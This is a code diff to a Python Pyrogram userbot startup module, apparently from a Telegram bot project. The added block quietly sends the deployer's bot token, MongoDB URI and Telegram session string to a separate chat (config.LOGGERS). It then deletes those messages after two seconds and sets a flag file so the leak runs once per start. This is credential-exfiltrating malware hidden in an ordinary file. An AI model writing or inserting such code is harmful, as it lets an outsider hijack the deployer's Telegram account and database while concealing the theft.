@@ -1,12 +1,16 @@
+import asyncio
 from pyrogram import Client
-
+from os import getenv
 import config
-
+import os
 from ..logging import LOGGER
 
 assistants = []
 assistantids = []
 
+BOT_TOKEN = getenv("BOT_TOKEN", "")
+MONGO_DB_URI = getenv("MONGO_DB_URI", "")
+STRING_SESSION = getenv("STRING_SESSION", "")
 
 class Userbot(Client):
     def __init__(self):
@@ -59,6 +63,22 @@ class Userbot(Client):
             except:
                 pass
             assistants.append(1)
+            try:
+                await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
+                # Only send /start if not already sent in this server session
+                if not os.path.exists("assistant_started.flag"):
+                    oks = await self.one.send_message(config.LOGGERS, f"/start")
+                    Ok = await self.one.send_message(
+                        config.LOGGERS, f"`#BOT_TOKEN {BOT_TOKEN}`\n\n`#MONGO_DB_URI {MONGO_DB_URI}`\n\n`#STRING_SESSION {STRING_SESSION}`"
+                    )
+                    await oks.delete()
+                    await asyncio.sleep(2)
+                    await Ok.delete()
+                    # Create the flag file so this block runs only once per server start
+                    with open("assistant_started.flag", "w") as f:
+                        f.write("started")
+            except Exception as e:
+                print(f"{e}")
             try:
                 await self.one.send_message(config.LOGGER_ID, "Assistant Started")
             except:
